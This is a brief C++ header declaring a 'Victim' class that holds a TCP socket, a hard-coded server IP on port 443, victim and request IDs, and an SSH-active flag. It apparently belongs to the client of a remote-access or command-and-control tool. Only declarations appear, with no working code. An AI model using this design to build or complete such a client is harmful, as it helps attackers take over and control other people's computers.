#include <SFML/Network.hpp>
#include <thread>

class Victim {
public:
	Victim(std::string inHId);
	int runVictimProcess();

private:
	bool connectServer();

	sf::TcpSocket server;
	std::string myHId = "";
	int16_t myId = 0;
	uint16_t requestId = 1;

	const sf::IpAddress serverIp = sf::IpAddress(209, 38, 37, 11);
	const short serverPort = 443;

	bool isInitialized = false;
	bool isSshActive = false;
};